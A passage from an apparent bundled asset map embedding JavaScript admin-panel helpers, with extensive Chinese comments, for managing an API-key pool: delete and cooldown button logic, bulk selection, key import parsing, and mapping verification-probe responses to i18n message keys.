Math.trunc(m / 60);\n  if (h < 24) return `${h}小时${m % 60}分`;\n  return `${Math.trunc(h / 24)}天${h % 24}小时`;\n}\n\n/**\n * 字节数 → MB，一位小数。**只用于概览页的 RSS 展示**，`0` 与「没有值」必须分得开：\n * 一个刚起的进程 RSS 确实可能非常小，但绝不会是 0——把「没有值」渲染成 `0 MB`\n * 会让运维误读成「进程占用真的是零」。\n */\nexport function fmtBytesMb(bytes) {\n  if (bytes === null || bytes === undefined || typeof bytes !== \"number\" || !Number.isFinite(bytes)) return \"—\";\n  return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;\n}\n\n/**\n * 时刻。`offsetMs` 是要渲染的时区相对 UTC 的偏移（毫秒），由调用方算好传进来。\n * 尾巴上的 `UTC+N` **必须有**：不标时区的时间戳在多 colo 部署里毫无意义。\n */\nexport function fmtInstant(ms, offsetMs) {\n  if (ms === null || ms === undefined || typeof ms !== \"number\" || !Number.isFinite(ms)) return \"—\";\n  const off = typeof offsetMs === \"number\" && Number.isFinite(offsetMs) ? offsetMs : 0;\n  const d = new Date(ms + off);\n  const p = (n, w) => String(n).padStart(w, \"0\");\n  const body = `${d.getUTCFullYear()}-${p(d.getUTCMonth() + 1, 2)}-${p(d.getUTCDate(), 2)} `\n    + `${p(d.getUTCHours(), 2)}:${p(d.getUTCMinutes(), 2)}:${p(d.getUTCSeconds(), 2)}`;\n  const hours = off / 3600_000;\n  const sign = hours < 0 ? \"-\" : \"+\";\n  const abs = Math.abs(hours);\n  const label = Number.isInteger(abs) ? String(abs) : abs.toFixed(2).replace(/0+$/, \"\").replace(/\\.$/, \"\");\n  return `${body} UTC${sign}${label}`;\n}\n", type: "text/javascript; charset=utf-8", etag: "\"80483d284a14e96c\"" },
  "/admin/js/pure/keys-write.mjs": { body: "/**\n * Key 池板块**写操作**的绝大多数取值决策（P3c Task 4）。\n *\n * ⚠️⚠️ **这里原来写着\"板块文件只剩 DOM 拼装、事件绑定与网络调用\"，是一句被\n * 复评证伪过的\"一律\"**：`js/sec-keys.js` 自己的文件头如实登记了一条至今仍然\n * 留在板块文件里、且被判定为可接受的例外（`runBulkWithConfirm` 的\n * `ids.length === 0` 早退，理由见那份文件头）。两份文件头不该各说各话——\n * 这条纪律的诚实版本与 `sec-keys.js` 那句是同一句：**\"取值决策原则上住在这里，\n * 例外必须在留下它的那个文件里说清楚是哪些、为什么\"**，不是一句无条件的\"只剩\"。\n *\n * 这一批判据尤其容易被漏放在这里——上一期（P3b）在同一条规则上栽了四次，\n * 每次都是「先写在板块文件里，下一期再搬」。本文件覆盖简报点名的三类判据：\n * **按钮可用性、确认文案要不要出现、批量选择的边界**。\n *\n * 这个目录下的文件受三条硬规则约束（禁 import、禁浏览器全局、纯文本校验），\n * 规则全文见 admin-ui/README.md。\n */\n\n/**\n * 一把 key 能不能删。**与后端 `src/http/admin/handlers/keys-write.ts` 的\n * `deletable()` 是同一条判据的前端半身**，两条都不成立才拦：\n * `disabled === true || evicted === true`。\n *\n * ⚠️ **只看 `evicted` 是一个已知会咬人的错误写法**——一把被运维手动停用、\n * 但从未被系统剔除的 key 会被前端永远挡在删除按钮外面，即使后端本来放行。\n * 反过来只看 `disabled` 同样错：一把被系统剔除但运维没手动停用过的 key\n * 也必须删得掉。\n */\nexport function isDeletable(view) {\n  return !!(view && (view.disabled === true || view.evicted === true));\n}\n\n/**\n * 单条 `DELETE` 的 409 拒绝是不是「必须先停用」这一种。\n *\n * ⚠️ **它与批量路径的判据是同一件事的两种形状**：单条是 HTTP 409 + 顶层\n * `reason`，批量是 HTTP 200 + 逐项 `reason`（`bulkResultSummary()` 判的就是\n * 后一种，见该函数的说明）。两条路径各自读自己那种形状，但「reason 字符串\n * 是不是等于 `must_disable_first`」这条比较本身只应该有一份实现——原来它\n * 直接写在 `sec-keys.js` 的 `deleteOne()` 里，评审指出这与文件头「取值决策\n * 一律不写在这里」的说法矛盾（它确实是一条判据，只是恰好也有测试守着），\n * 现在搬到这里，两边都不用再各自比较字符串。\n */\nexport function isMustDisableFirstConflict(status, reason) {\n  return status === 409 && reason === \"must_disable_first\";\n}\n\n/**\n * 「清冷却」按钮只在这把 key 确实处在冷却期时才有意义。\n *\n * ⚠️⚠️ **判据是 `cooldownUntil > now`，不是 `bucket === \"cooling\"`**（评审实测抓到\n * 的一个真缺陷）：`bucket` 是 `src/core/admin/key-view.ts` 的 `keyBucket()` 按\n * `disabled > evicted > cooling > fresh` 算出来的**优先级投影**，一把「已停用\n * 且仍在冷却」的 key 的 `bucket` 是 `\"disabled\"`，不是 `\"cooling\"`——但它的\n * `cooldownUntil` 确实还没到，后端的 `PATCH { clearCooldown: true }` 照样接受、\n * 照样清得掉。拿 `bucket` 当判据会让这把 key 的「清冷却」按钮永远禁用，即使\n * 运维刚把它启用回来——**按钮说「不能」，后端说「能」，两边对不上**。\n */\nexport function canClearCooldown(view, now) {\n  return !!(view && typeof view.cooldownUntil === \"number\" && typeof now === \"number\"\n    && view.cooldownUntil > now);\n}\n\n/** 「解除剔除」按钮只在这把 key 确实被剔除时才有意义。 */\nexport function canUnevict(view) {\n  return !!(view && view.evicted === true);\n}\n\n/**\n * 「清 strikes」按钮只在这把 key 确实有连续失败计数时才有意义\n * （`view.strikes > 0`）——零 strikes 时点它什么都不会变，按钮亮着只是噪音。\n *\n * ⚠️ **这不是「清冷却」的同义词，两者的可用性判据也刻意不同**：`canClearCooldown`\n * 看的是 `cooldownUntil > now`（见上面那个函数自己的说明——那里也记着为什么\n * 不能改成看 `bucket`），`strikes` 不会自动清零、只能靠这个动作或者一次成功\n * 请求把它降下来。控制端裁定（追加）：这是设计\n * §10.2 行内动作清单里本来就有、后端 PATCH 也已经支持的第五个动作，第一版的\n * 简报动作清单漏列了它——补的是遗漏，不是新范围。\n */\nexport function canClearStrikes(view) {\n  return !!(view && typeof view.strikes === \"number\" && view.strikes > 0);\n}\n\n/** 停用/启用那颗按钮该显示哪个 i18n key，取决于当前是不是已经停用。 */\nexport function toggleDisableLabelKey(view) {\n  return view && view.disabled === true ? \"keys.action.enable\" : \"keys.action.disable\";\n}\n\n/**\n * 哪些单条行内动作在执行前需要一次确认弹窗。**两种不同的理由触发它，别混成一条：**\n *\n * ① **不可撤销**——只有删除符合。停用/启用/清冷却/解除剔除随时可以再点一次撤回，\n *    弹窗只会让运维在这几个动作上多点一次没有实际保护作用的确认——那不是谨慎，\n *    是让人对真正需要谨慎的那个动作（删除）变得麻木。\n * ② **语义容易与相邻动作混淆**——`clearStrikes` 符合。它与「清冷却」长得像\n *    \"清空某个数字\"，但清冷却只是让这把 key **现在**能用，它离下一次被剔除仍然\n *    只差一次失败；`clearStrikes` 才会把连续失败计数真正清零，给它一次干净的\n *    机会。这里的确认弹窗保护的不是\"能不能撤销\"（它本身也能撤销——strikes 会\n *    随后续失败重新累积），是\"点的时候知不知道自己点的是哪一个\"——运维容易\n *    以为点了「清冷却」就等于清空了账本。\n */\nexport function rowActionNeedsConfirm(action) {\n  return action === \"delete\" || action === \"clearStrikes\";\n}\n\n/** 同一条判据用在批量动作上。三个批量动作里只有 `delete` 需要确认。 */\nexport function bulkNeedsConfirm(op) {\n  return op === \"delete\";\n}\n\n/**\n * 「全选」动作要选中的 id 集合。**只能是调用方传入的 `items` 里的 id**——\n * 也就是**当前页**，不许基于 `total` / `counts.all` 这类别的字段去构造一个\n * 更大的集合。\n *\n * 照抄 kiro2api 的安全约束（设计文档 §10.2）：一键选中一千个看不见的行再批量\n * 删除，后果不可挽回。这个函数的入参就是唯一的信任边界——它没有办法访问\n * 当前页之外的任何东西，\"选中全部筛选结果\"这类实现只能通过**另外发起请求\n * 拉更多数据**才能做到，那种改法在源码 diff 里不会长得像\"改一行\"。\n */\nexport function selectAllIds(items) {\n  if (!Array.isArray(items)) return [];\n  const out = [];\n  for (const v of items) if (v && typeof v.id === \"string\") out.push(v.id);\n  return out;\n}\n\n/**\n * 换页 / 换筛选之后，哪些已选中的 id 还留得住。\n *\n * 不在当前页 `items` 里的 id 一律丢弃——选择框只描述\"当前能看到、且被勾选\"\n * 的那些行，留着看不见的 id 会让批量条上的「已选 N 把」这个数字与屏幕上\n * 实际打勾的行对不上。\n */\nexport function pruneSelection(selectedIds, items) {\n  const present = new Set(selectAllIds(items));\n  const list = Array.isArray(selectedIds) ? selectedIds : [];\n  return list.filter((id) => present.has(id));\n}\n\n/**\n * 单行勾选框变化之后，选中集合该变成什么样。\n *\n * ⚠️ **评审第二轮点名的例外之一**：这条去重加入 / 过滤移除的逻辑原来直接写在\n * `sec-keys.js` 的 `selectCell()` 事件处理器里，没有任何测试钉着——`selected`\n * 是不是真的去重了（同一个 id 被两次 `change` 事件加进去两次）、移除是不是真的\n * 精确匹配 id，都只能靠代码评审信。搬到这里，`selected.includes(id)` 那道\n * 去重闸与 `filter` 的移除都能单独测。\n */\nexport function toggleSelection(selectedIds, id, checked) {\n  const list = Array.isArray(selectedIds) ? selectedIds : [];\n  if (checked) return list.includes(id) ? list : [...list, id];\n  return list.filter((x) => x !== id);\n}\n\n/**\n * 表头「全选本页」复选框变化之后，选中集合该变成什么样（并集 / 差集）。\n *\n * ⚠️ **评审第二轮点名的例外之一**：并集/差集这两步原来直接写在 `headerSelectCell()`\n * 的事件处理器里。**并集用 `Set` 去重，差集只删当前页的 id**——后者尤其要紧：\n * 取消全选时如果直接把 `selected` 清空，会把\"用户在别的页面手动勾过的行\"也\n * 一起清掉，那不是这个复选框该管的范围（它只代表\"当前页\"）。\n */\nexport function applySelectAll(selectedIds, pageIds, checked) {\n  const selected = Array.isArray(selectedIds) ? selectedIds : [];\n  const ids = Array.isArray(pageIds) ? pageIds : [];\n  if (checked) return [...new Set([...selected, ...ids])];\n  const drop = new Set(ids);\n  return selected.filter((id) => !drop.has(id));\n}\n\n/**\n * 表头「全选本页」复选框该不该打勾。\n *\n * **空页（`pageIds.length === 0`）恒不打勾**，即使 `every()` 对空数组恒真——\n * 这不是数学上的边界情形，是一条产品判据：读失败 / 空列表时那一列没有任何\n * 一行，勾选框打上勾等于在向运维宣称\"我选中了点东西\"，而屏幕上什么都没有。\n */\nexport function headerSelectAllChecked(pageIds, selectedIds) {\n  const ids = Array.isArray(pageIds) ? pageIds : [];\n  const selected = Array.isArray(selectedIds) ? selectedIds : [];\n  return ids.length > 0 && ids.every((id) => selected.includes(id));\n}\n\n/** 批量条该不该出现。设计文档 §10.2：「选中才出现」。 */\nexport function bulkBarVisible(selectedCount) {\n  return typeof selectedCount === \"number\" && selectedCount > 0;\n}\n\n/**\n * 三个旋钮（`ttl` / `touch` / `edge`）是不是已经拿到过一次生效值——`loadKnobs()`\n * 用它决定要不要再打一次 `/overview`。\n *\n * ⚠️ **评审第二轮点名的例外之一**：这条判据原来是 `sec-keys.js` 里一个内联的\n * 三元 `||` 判断。**只要有一个非 null 就算\"已经拿到过\"**，不要求三个都非\n * null——三个旋钮来自同一次响应的同一个块（`overview.freshness`），只要那次\n * 响应成功过，三个字段要么一起有值、要么一起是 null（同一次 `poolKnobs()`\n * 投影），检查任意一个就够，写成\"三个都要非 null\"反而会在响应体只給出\n * 部分字段的畸形情形下误判成\"还没拿到\"、重复发请求。\n */\nexport function knobsLoaded(knobs) {\n  return !!(knobs && (knobs.ttl !== null || knobs.touch !== null || knobs.edge !== null));\n}\n\n/**\n * `POST /admin/api/keys/bulk` 的逐项结果汇总成面板要显示的四个数。\n *\n * ⚠️⚠️ **这个函数存在的全部理由**：`bulk` 端点的 HTTP 状态码永远是 200\n * （见 `src/http/admin/handlers/keys-write.ts` 的 `keysBulkHandler` 文件头），\n * 「必须先停用才能删」这条拒绝**只活在逐项结果的 `reason` 字段里**。\n * 拿状态码当唯一判据的前端会在这条路径上完全看不到这条拒绝——\n * 一次「批量删除 20 把」里有 3 把被拒，前端会显示\"全部成功\"。\n * 这个函数把\"看不看得到\"变成了一次纯函数调用，不需要在渲染代码里重新数一遍。\n */\nexport function bulkResultSummary(results) {\n  const list = Array.isArray(results) ? results : [];\n  let ok = 0, mustDisableFirst = 0, notFound = 0, otherFailed = 0;\n  for (const r of list) {\n    if (!r || typeof r !== \"object\") continue;\n    if (r.ok === true) { ok++; continue; }\n    if (r.reason === \"must_disable_first\") mustDisableFirst++;\n    else if (r.reason === \"not_found\") notFound++;\n    else otherFailed++;\n  }\n  const failed = mustDisableFirst + notFound + otherFailed;\n  return { total: list.length, ok, failed, mustDisableFirst, notFound, otherFailed };\n}\n\n/**\n * 批量结果提示该用哪个 i18n key 起头。**判据只看 `failed`**（上面那个函数\n * 已经把\"被拒绝\"这件事从状态码里解放出来了），不是看 HTTP 状态。\n */\nexport function bulkResultKey(summary) {\n  return summary && summary.failed > 0 ? \"keys.bulk.partial\" : \"keys.bulk.allOk\";\n}\n\n/**\n * `bulkResultSummary()` 的输出再投影成 toast 要用的全部东西：拼哪几个 i18n key\n * （按顺序）、`kind` 是 `\"ok\"` 还是 `\"warn\"`、要不要 `sticky`。\n *\n * ⚠️⚠️ **评审第二轮点名的例外**：这三件事原来分散写在 `sec-keys.js` 的\n * `runBulk()` 里——三段字符串拼接、`summary.failed > 0 ? \"warn\" : \"ok\"`、\n * `summary.failed > 0 ? {sticky:true} : undefined`，三处判据各写各的，容易\n * 有的改了、有的忘了改（例如把 sticky 的条件改对了，却漏改 kind）。**这里\n * 不能直接拼出文案本身**——那需要 `t()`，而 `t()` 要 `import \"./i18n.js\"`，\n * `js/pure/` 下禁止 import（admin-ui/README.md 硬规则 1）。这个函数返回的是\n * \"拼哪些 key、以什么顺序\"，真正调 `t()` 插值仍然在 `sec-keys.js`。\n *\n * ⚠️ **每个候选 key 都是数组的独立元素、都带着尾逗号**——不是风格洁癖：\n * `scripts/check-i18n.mjs` 第 ⑧ 条的判据是\"这个带占位符的 key 字面量后面\n * 紧跟的是不是逗号\"，写成 `x ? \"key\" : null` 的话字面量后面紧跟的是空格加\n * `:`，会被那道门禁误判成\"当裸标签用\"。用 `条件 && \"key\"` 让字面量后面直接\n * 是数组的逗号分隔符，天然满足门禁——数组元素带尾逗号是这个文件已有的写法\n * （`sec-keys.js` 的 `for (const key of [...])` 那几处同样在最后一个元素后\n * 留了尾逗号），不是为了糊弄门禁去构造一个巧合写法。\n */\nexport function bulkResultPresentation(summary) {\n  const s = summary || {};\n  const conditional = [\n    s.mustDisableFirst > 0 && \"keys.bulk.mustDisableFirstSuffix\",\n    s.notFound > 0 && \"keys.bulk.notFoundSuffix\",\n  ].filter((k) => typeof k === \"string\");\n  const messageKeys = [\n    bulkResultKey(s),\n    \"keys.bulk.countsSuffix\",\n    ...conditional,\n  ];\n  return { messageKeys, kind: s.failed > 0 ? \"warn\" : \"ok\", sticky: s.failed > 0 };\n}\n\n/**\n * 导入框的原始文本按行拆开。**逐行原样返回，含空行**——这是 Task 3 在\n * `src/core/keypool-repo.ts` 的 `addMany()` 里定死的口径：后端把空行整条跳过、\n * 但非法项的位置仍按**原始下标**算（1 基）。前端如果先过滤掉空行再发，\n * 位置就与运维在文本框里数到的行号错位；如果把空行也报成\"第 N 行不合法\"，\n * 那是一条用户没犯过的错误。**两难的唯一解法是原样发**，这个函数就是那个\n * \"原样\"——不 trim、不过滤、只按行分隔符拆开。\n *\n * `\\r\\n` / `\\r` / `\\n` 三种换行都认：textarea 在不同操作系统上可能产出任意一种。\n */\nexport function importLines(text) {\n  if (typeof text !== \"string\" || text === \"\") return [];\n  return text.split(/\\r\\n|\\r|\\n/);\n}\n\n/** 拆完的行里有没有至少一把看起来像 key 的内容（非空白）。用来挡掉空提交。 */\nexport function hasImportableContent(lines) {\n  return Array.isArray(lines) && lines.some((l) => typeof l === \"string\" && l.trim() !== \"\");\n}\n\n/**\n * `POST /admin/api/keys` 响应体投影成面板要显示的计数。\n *\n * ⚠️⚠️ **`reset` 必须原样取自响应字段，不许用 `duplicated.length` 代替**\n * （评审 I2）。两者不是一回事：本批之前就已经在池子里、又勾了 `resetExisting`\n * 的那些才算\"被重置\"；本批刚新建的那把即使被粘了两遍也谈不上重置。\n * `src/core/keypool-repo.ts` 的 `addMany()` 原话：「一个动作两个数字，\n * 正是面板开始撒谎的方式」——这里就是那两个数字第一次分道扬镳的地方。\n */\nexport function importResultCounts(body) {\n  const b = body && typeof body === \"object\" ? body : {};\n  const arr = (v) => (Array.isArray(v) ? v : []);\n  return {\n    added: arr(b.added).length,\n    duplicated: arr(b.duplicated).length,\n    invalidLines: arr(b.invalid).filter((n) => typeof n === \"number\" && Number.isFinite(n)),\n    reset: typeof b.reset === \"number\" && Number.isFinite(b.reset) ? b.reset : 0,\n  };\n}\n\n/**\n * `importResultCounts()` 的输出再投影成 toast 要用的东西：`keys.import.result`\n * 的插值参数、要不要再拼一段\"不合法的行\"、`kind` 是 `\"ok\"` 还是 `\"warn\"`。\n *\n * ⚠️⚠️ **评审第二轮点名的例外**：`invalidLines.length > 0` 这条判据原来在\n * `sec-keys.js` 的 `openImport()` 里被问了两次（一次决定要不要拼后缀、一次\n * 决定 `kind`），两处各写一份布尔表达式——这正是\"同一件事两处判断，容易改\n * 一处漏一处\"的形状。这里只算一次。\n */\nexport function importResultPresentation(counts) {\n  const c = counts || {};\n  const invalidLines = Array.isArray(c.invalidLines) ? c.invalidLines : [];\n  const hasInvalid = invalidLines.length > 0;\n  return {\n    resultParams: { added: c.added ?? 0, duplicated: c.duplicated ?? 0, reset: c.reset ?? 0, invalid: invalidLines.length },\n    showInvalidSuffix: hasInvalid,\n    kind: hasInvalid ? \"warn\" : \"ok\",\n  };\n}\n\n/**\n * 一条错误 `message` 是不是\"内部码\"，不该原样丢给运维看。\n *\n * ⚠️⚠️ **这条判据存在的理由是 `sec-keys.js` 一句被评审探针证伪的注释**：\n * 原来那句「绝不把裸的 `http_500` 这类内部码丢给运维」只判断了\"是不是非空\n * 字符串\"，而 `js/api.js` 的 `json()` 在响应体没有 `error.message` 时把\n * message 落成 `` `http_${res.status}` ``（如 `\"http_500\"`），401/会话过期时\n * 落成字面量 `\"unauthorized\"` / `\"session_expired\"`——三种都是非空字符串，\n * 会原样出现在 toast 里。\n *\n * **这不是全部破口**：后端校验类 400 的 `error.message` 是中文散文（例如\n * note 超长时的「note 最长 200 个字符」），没有配套的机器可读 `reason` 字段\n * （不像 409 `must_disable_first` 那样），这条判据拦不住它——那句中文会被\n * 直接投到 ja/en/ko 的面板上。这是全面板第一处把后端原始 message 渲染给\n * 用户的地方。**归属定死：这条破口归 P3e（五语言与收尾）**——机制解是后端\n * 只回错误码、前端查五语言字典，或后端按 `Accept-Language` 返回，两条路各有\n * 代价，留给 P3e 裁，本任务不在这里假装解决。\n */\nexport function isOpaqueErrorMessage(message) {\n  if (typeof message !== \"string\" || message === \"\") return true;\n  return /^http_\\d+$/.test(message) || message === \"unauthorized\" || message === \"session_expired\";\n}\n\n/**\n * 备注框的字符上限，与 `src/http/admin/handlers/keys-write.ts` 的\n * `MAX_NOTE_LENGTH` 保持一致——这个常量只用来给 `<textarea>` 一个 `maxlength`\n * 提示，真正的边界仍然由后端强制（超长会 400，前端不重复实现那条校验）。\n *\n * ⚠️ **它原来是 `sec-keys.js` 里一个本地常量，没有任何测试钉着它的值**——\n * 改成 20 也不会有任何东西变红，而 200 这个数字本身是一条与后端契约对齐的\n * 判据（不是随手选的），理应像 `MAX_IMPORT_KEYS` / `MAX_NOTE_LENGTH` 在\n * `tests/contract/admin-keys-write.test.ts`「三个边界常量写字面量钉死」那格\n * 一样被钉住。这里的对应测试见 `tests/ui/keys-write.test.ts`「是 200，不是别的数字」。\n */\nexport const NOTE_MAX_LENGTH = 200;\n\n/**\n * 备注格该显示内容还是显示 `—`。\n *\n * ⚠️ **评审第二轮点名的例外之一**：这条判据原来直接写在 `sec-keys.js` 的\n * `noteCell()` 里。**空字符串算\"没有内容\"，不是\"有内容但是空的\"**——后端把\n * `note: \"\"` 与 `note: null` 都投影成不同的值（`KeyView.note` 恒是\n * `string | null`），但对运维来说\"这一格能不能读出字来\"只有一个答案，\n * 空字符串与 `null` 应该显示成同一个 `—`。\n */\nexport function hasNote(view) {\n  return !!(view && typeof view.note === \"string\" && view.note.length > 0);\n}\n\n/**\n * 备注编辑框的内容转成 PATCH 请求体里的 `note` 字段。\n *\n * **清空输入框 = 清空备注（`null`），不是发一个空字符串**：空字符串在后端是一个\n * \"合法但没有意义\"的备注值，而用户清空文本框时想表达的是\"删掉这条备注\"，\n * 两者应该是同一个动作，不许留一个只有实现者自己知道的分叉。\n */\nexport function noteToPatch(text) {\n  if (typeof text !== \"string\" || text.length === 0) return null;\n  return text;\n}\n\n// ───────────────────────────────────────────────────────────────────────────\n// 单把 key 的验活入口（P3d Task 9）。端点与它的出站探测护栏是 Task 8 交付的。\n// ───────────────────────────────────────────────────────────────────────────\n\n/**\n * 验活按钮在**前端这一侧**的最小间隔。\n *\n * ⚠️⚠️ **它不是护栏，别把它读成护栏。** 真正的护栏在后端\n * （`src/http/admin/probe-guard.ts` 的 `PROBE_MIN_INTERVAL_MS` + 在途去重），\n * 而且那一份也只是进程/isolate 内的（多副本部署下上界是「每个间隔 N 次」，\n * 理由写在那份文件头）。这里这个数只做一件事：**让运维看到一颗变灰的按钮，\n * 而不是按下去换回一句「请稍后再试」**——他什么错都没犯。\n * 与 `js/sec-registrar.js` 的 `runChannelTest()` 里那句「前端禁用与后端护栏\n * 各自还挡住了对方挡不住的那一半」是同一条口径，不是「两者不重叠」。\n *\n * **两个数必须相等**，由 `tests/ui/keys-write.test.ts` 的\n * 「前端这个最小间隔与后端 PROBE_MIN_INTERVAL_MS 是同一个数」那一格钉着\n * （它直接 import 后端那个常量比较，两处漂了就红）。\n *\n * ⚠️ **相等只在「两边各自量一段时长」这个意义上成立**：前端从**发起**那一刻起算，\n * 后端从**收到**那一刻起算，中间隔着一次网络往返 ⇒ 前端的冷却总是**略早**到期，\n * 于是边界上仍然可能换回一次 429。那一次由 `verifyTransportCode()` 如实翻译成\n * `probe_cooldown`，**不是**靠这个常量去消灭它。\n */\nexport const VERIFY_MIN_INTERVAL_MS = 3_000;\n\n/**\n * 验活按钮的可用性。**返回四种值，其中三种是各自可区分的 disable 理由**——\n * 只说「不可用」运维只能猜（这与 `canClearCooldown` / `canUnevict` 那一批只回\n * 布尔的按钮不同：那几颗按钮的不可用理由一眼能从同一行的数据里读出来，\n * 而「上一次还在飞」与「刚探过」这两种在屏幕上长得一模一样）。\n *\n * `state` 是 `js/sec-keys.js` 里那张按 key id 索引的验活状态表里的一项\n * （`{ inFlight, lastAt, code }`），没有这一项时传 `undefined` —— 那表示这把 key\n * 这一次进面板以来还没被验过，按钮可用。\n *\n * ⚠️ **`in_flight` 必须排在 `cooling_down` 前面。** 在飞期间 `lastAt` 恒等于\n * 「刚刚」，两条判据**同时成立**；顺序反了的话运维会看到「刚探过，隔一会儿再试」\n * ——而真相是那一次探测还没回来。两种处置不同（等它 / 稍后再来），这与后端\n * `probe_in_flight` / `probe_cooldown` 分成两条 reason 是同一条理由。\n * 由 `tests/ui/keys-write.test.ts` 的「在飞与冷却同时成立时报的是在飞」那一格钉着。\n *\n * @returns {null|\"in_flight\"|\"cooling_down\"|\"no_key\"}\n */\nexport function verifyDisabledReason(row, state, now) {\n  // `no_key` 是**结构性**的：这一行根本没有可寻址的 id，`POST /keys//verify` 只会 404。\n  // ⚠️ 它刻意**不**包含「这把 key 已停用 / 已被剔除」——恰恰相反，\"它是不是真的死了\"\n  // 正是运维最想验的那一把，禁掉它等于把这颗按钮从唯一有用的场景里拿走。\n  if (!row || typeof row.id !== \"string\" || row.id === \"\") return \"no_key\";\n  if (!state || typeof state !== \"object\") return null;\n  if (state.inFlight === true) return \"in_flight\";\n  const last = state.lastAt;\n  if (typeof last === \"number\" && Number.isFinite(last)\n    && typeof now === \"number\" && Number.isFinite(now)\n    && now - last < VERIFY_MIN_INTERVAL_MS) return \"cooling_down\";\n  return null;\n}\n\n/**\n * disable 理由 → 按钮 `title` 的 i18n key。**返回字面量，一个都不许拼**\n * （全局约束 12：动态拼出来的 key 对 `scripts/check-i18n.mjs` 完全隐身，\n * 拼错一个字母面板显示裸 key、全部门禁绿）。\n *\n * `null`（可用）也有一条：那一句说的是**按下去会发生什么**\n * （「按一下会真的向上游发一次请求」），属于全局约束 14 那颗按钮该自带的告知。\n */\nexport function verifyDisabledTitleKey(reason) {\n  if (reason === \"in_flight\") return \"keys.verify.disabledInFlight\";\n  if (reason === \"cooling_down\") return \"keys.verify.disabledCoolingDown\";\n  if (reason === \"no_key\") return \"keys.verify.disabledNoKey\";\n  return \"keys.verify.hintEnabled\";\n}\n\n/**\n * **200 响应体里那个 `reason` 字段**的已知取值 → 文案 code。\n * 表外一律 `null`，由 `verifyResultCode()` 翻成 `unknown_reason`。\n *\n * ⚠️⚠️ **这张表必须是显式的，不许写成「不认识就当网络错误」。** 后端\n * `src/http/admin/handlers/verify.ts` 的 catch 分支今天只产出 `timeout` /\n * `network_error` 两种，但**加一种是一行 diff**，而「面板没跟上」这件事\n * 在 P3d Task 8 上已经真实发生过一次（护栏加了两条 reason，\n * `admin-ui/js/pure/registrar.mjs` 的表当时没跟上）。落进 `network_error`\n * 的后果是面板对运维说「连不上上游」，而真相可能完全不是那回事。\n * 由 `tests/ui/keys-write.test.ts` 的\n * 「验活端点 200 响应体里的每一条 reason，面板都认得 —— 认不得的会被诚实地说成\n * 「面板还不认识」，而这一格要求根本别走到那里」那一格钉着（它直接读\n * `src/http/admin/handlers/verify.ts` 的源码，把「它可能产出什么」读出来对表）。\n */\nfunction verifyBodyReasonCode(reason) {\n  if (reason === \"timeout\") return \"timeout\";\n  if (reason === \"network_error\") return \"network_error\";\n  return null;\n}\n\n/**\n * **200 响应体** → 文案 code（**不是句子**：面板是五语言的，自由文本没法翻译）。\n *\n * ⚠️ **它只吃 200 的响应体，非 2xx 一律不走这里。**\n * `admin-ui/js/api.js` 的 `json()` 对任何非 2xx 都 `throw new ApiError(status, msg, parsed)`\n * ⇒ 面板拿到的是异常，不是 `{ok,status,latencyMs,reason}`。\n * 把 `ApiError` 塞进这个函数的后果是**面板对运维说假话**：探测闸占用返回的 **429**\n * 会落进 `rate_limited`，而那个码的文案是「上游在限流……等一会儿就好」——\n * **一次上游请求都没发出去**；404（这把 key 不存在）会变成 `upstream_error`「上游炸了」。\n * ⇒ 传输层错误走下面那个 `verifyTransportCode()`，两个函数各管一半。\n *\n * ⚠️ **`status` 说的是上游回了什么，`reason` 说的是这次探测有没有发出去**——\n * `reason` 非空时 `status` 恒为 `null`（后端 catch 分支），所以先判 `reason`。\n *\n * @returns {\"ok\"|\"unauthorized\"|\"rate_limited\"|\"upstream_error\"|\"timeout\"|\"network_error\"|\"unknown_reason\"}\n */\nexport function verifyResultCode(resp) {\n  if (!resp || typeof resp !== \"object\") return \"network_error\";\n  if (typeof resp.reason === \"string\") {\n    const mapped = verifyBodyReasonCode(resp.reason);\n    return mapped === null ? \"unknown_reason\" : mapped;\n  }\n  const s = resp.status;\n  if (typeof s !== \"number\") return \"network_error\";\n  if (s >= 200 && s < 300) return \"ok\";\n  // ⚠️ **401/403 说的是「这把 key 失效了」，429 说的是「上游在限流」，两者对运维\n  // 是完全不同的两件事**：前者要换 key，后者等一会儿就好。合成一条就是让运维\n  // 去做一件没用的事（与 dispatcher 里 all_disabled 不复用 all_evicted 同一条理由）。\n  if (s === 401 || s === 403) return \"unauthorized\";\n  if (s === 429) return \"rate_limited\";\n  return \"upstream_error\";\n}\n\n/**\n * **管理层传输错误**（`js/api.js` 的 `ApiError`）→ 文案 code。\n * 与上面那个函数**严格分开**：这一族说的全是「这次探测根本没发出去」，与上游状态无关。\n *\n * ⚠️⚠️ **判据是顶层 `reason`，不是状态码，也不是那句中文 `message`。**\n * 出站探测护栏（`src/http/admin/probe-guard.ts`）在同一个 **429** 下产出**两种**\n * 拒绝，它们的处置完全不同：\n *   · `probe_in_flight` —— 上一次探测还在飞，**等它回来**；\n *   · `probe_cooldown`  —— 两次之间要隔一小段，**稍后再试**，\n *     而且它**不是这把 key 的故障**（说成故障运维就会去换一把好 key）。\n * 只看 429 会把两者合成一句话；解析 `message` 那句中文会在切到别的语言时整个失效\n * （而后端只有中文一种）。这与 `js/pure/registrar.mjs` 的 `refuseReasonKey()`\n * 「状态码不是判据」是同一条口径，**两处必须一致**——两条端点共用同一份护栏。\n *\n * ⚠️ **表外的 429 落进 `transport_error`，不冒充任何一档已知原因**——与\n * `refuseReasonKey()` 表外回 `null` 同一条纪律。今天后端产不出第三种，\n * 而「今天产不出」正是需要那格源码级对表守着的东西。\n *\n * @returns {\"probe_in_flight\"|\"probe_cooldown\"|\"key_not_found\"|\"unauthorized_admin\"|\"transport_error\"}\n */\nexport function verifyTransportCode(err) {\n  const body = err && typeof err.body === \"object\" && err.body !== null ? err.body : null;\n  const reason = body === null ? undefined : body.reason;\n  if (reason === \"probe_in_flight\") return \"probe_in_flight\";\n  if (reason === \"probe_cooldown\") return \"probe_cooldown\";\n  const s = err && typeof err.status === \"number\" ? err.status : 0;\n  if (s === 404) return \"key_not_found\";\n  if (s === 401) return \"unauthorized_admin\";\n  return \"transport_error\";\n}\n\n/**\n * code → i18n key。**返回字面量，一个都不许拼**（全局约束 12）。\n * 形态照抄 `js/pure/events.mjs` 的 `eventLevelLabelKey()`。\n *\n * ⚠️ 把前缀字面量与 `code` 拼起来再交给 `t()` 既违反约束 12，又对\n * `scripts/check-i18n.mjs` 里 `/\\bt\\(\"([^\"]+)\"/` 那条判据**完全隐身**\n * ⇒ 拼错一个字母面板显示裸 key、全部门禁绿。\n * ⚠️ **这段说明本身刻意不把那个反例写成可扫描的形态**：写成完整的调用样子时，\n * 